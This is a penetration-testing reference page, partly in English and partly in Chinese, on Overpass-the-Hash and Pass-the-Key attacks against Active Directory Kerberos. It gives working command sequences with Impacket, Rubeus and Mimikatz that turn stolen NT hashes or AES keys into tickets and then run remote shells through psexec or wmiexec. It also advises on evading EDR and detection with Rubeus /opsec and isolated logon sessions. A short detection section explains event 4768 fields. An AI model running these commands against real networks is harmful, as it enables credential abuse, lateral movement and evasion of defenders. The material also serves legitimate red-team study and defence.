# Over Pass the Hash/Pass the Key

{{#include ../../banners/hacktricks-training.md}}


## Overpass The Hash/Pass The Key (PTK)

**Overpass The Hash/Pass The Key (PTK)** attack is designed for environments where the traditional NTLM protocol is restricted, and Kerberos authentication takes precedence. This attack leverages the NTLM hash or AES keys of a user to solicit Kerberos tickets, enabling unauthorized access to resources within a network.

Strictly speaking:

- **Over-Pass-the-Hash** usually means turning the **NT hash** into a Kerberos TGT via the **RC4-HMAC** Kerberos key.
- **Pass-the-Key** is the more generic version where you already have a Kerberos key such as **AES128/AES256** and request a TGT directly with it.

This difference matters in hardened environments: if **RC4 is disabled** or no longer assumed by the KDC, the **NT hash alone is not enough** and you need an **AES key** (or the cleartext password to derive it).

To execute this attack, the initial step involves acquiring the NTLM hash or password of the targeted user's account. Upon securing this information, a Ticket Granting Ticket (TGT) for the account can be obtained, allowing the attacker to access services or machines to which the user has permissions.

The process can be initiated with the following commands:
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
对于需要 AES256 的场景，可以使用 `-aesKey [AES key]` 选项：
```bash
python getTGT.py -dc-ip 10.10.10.10 jurassic.park/velociraptor -aesKey <AES256_HEX>
export KRB5CCNAME=velociraptor.ccache
python wmiexec.py -k -no-pass jurassic.park/velociraptor@labwws02.jurassic.park
```
`getTGT.py` 也支持使用 `-service <SPN>` 通过 **AS-REQ** 直接请求 **service ticket**，这在你想要针对特定 SPN 获取 ticket，而不需要额外的 TGS-REQ 时很有用：
```bash
python getTGT.py -dc-ip 10.10.10.10 -aesKey <AES256_HEX> -service cifs/labwws02.jurassic.park jurassic.park/velociraptor
```
此外，获取到的 ticket 还可以配合多种工具使用，包括 `smbexec.py` 或 `wmiexec.py`，从而扩大攻击范围。

遇到诸如 _PyAsn1Error_ 或 _KDC cannot find the name_ 之类的问题，通常可以通过更新 Impacket 库，或使用 hostname 而不是 IP address 来解决，以确保与 Kerberos KDC 的兼容性。

使用 Rubeus.exe 的另一种命令序列展示了该技术的另一个方面：
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
这种方法与 **Pass the Key** 方法类似，重点在于直接接管并利用 ticket 进行身份验证。实际上：

- `Rubeus asktgt` 直接发送 **raw Kerberos AS-REQ/AS-REP**，并且**不需要**管理员权限，除非你想通过 `/luid` 目标定位到另一个 logon session，或者通过 `/createnetonly` 创建一个单独的会话。
- `mimikatz sekurlsa::pth` 会将 credential material 补丁写入一个 logon session，因此会**触及 LSASS**，这通常需要本地管理员或 `SYSTEM`，并且从 EDR 的角度看更容易被发现。

使用 Mimikatz 的示例：
```bash
sekurlsa::pth /user:velociraptor /domain:jurassic.park /ntlm:2a3de7fe356ee524cc9f3d579f2e0aa7 /run:cmd.exe
sekurlsa::pth /user:velociraptor /domain:jurassic.park /aes256:<AES256_HEX> /run:cmd.exe
```
为了符合 operational security 并使用 AES256，可以应用以下命令：
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
`/opsec` is relevant because Rubeus-generated traffic differs slightly from native Windows Kerberos. Also note that `/opsec` is intended for **AES256** traffic; using it with RC4 usually requires `/force`, which defeats much of the point because **RC4 in modern domains is itself a strong signal**.

## Detection notes

Every TGT request generates **event `4768`** on the DC. In current Windows builds this event contains more useful fields than older writeups mention:

- `TicketEncryptionType` tells you which enctype was used for the issued TGT. Typical values are `0x17` for **RC4-HMAC**, `0x11` for **AES128**, and `0x12` for **AES256**.
- Updated events also expose `SessionKeyEncryptionType`, `PreAuthEncryptionType`, and the client's advertised enctypes, which helps distinguish **real RC4 dependence** from confusing legacy defaults.
- Seeing `0x17` in a modern environment is a good clue that the account, host, or KDC fallback path still permits RC4 and is therefore more friendly to NT-hash-based Over-Pass-the-Hash.

Microsoft has been progressively reducing RC4-by-default behavior since the November 2022 Kerberos hardening updates, and the current published guidance is to **remove RC4 as the default assumed enctype for AD DCs by the end of Q2 2026**. From an offensive perspective, that means **Pass-the-Key with AES** is increasingly the reliable path, while classic **NT-hash-only OpTH** will keep failing more often in hardened estates.

For more details on Kerberos encryption types and related ticketing behaviour, check:

{{#ref}}
kerberos-authentication.md
{{#endref}}

## Stealthier version

> [!WARNING]
> Each logon session can only have one active TGT at a time so be careful.

1. Create a new logon session with **`make_token`** from Cobalt Strike.
2. Then, use Rubeus to generate a TGT for the new logon session without affecting the existing one.

You can achieve a similar isolation from Rubeus itself with a sacrificial **logon type 9** session:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES256_HEX> /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
这可以避免覆盖当前会话的 TGT，而且通常比将 ticket 导入到你现有的 logon session 中更安全。


## References

- [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)
- [https://github.com/GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
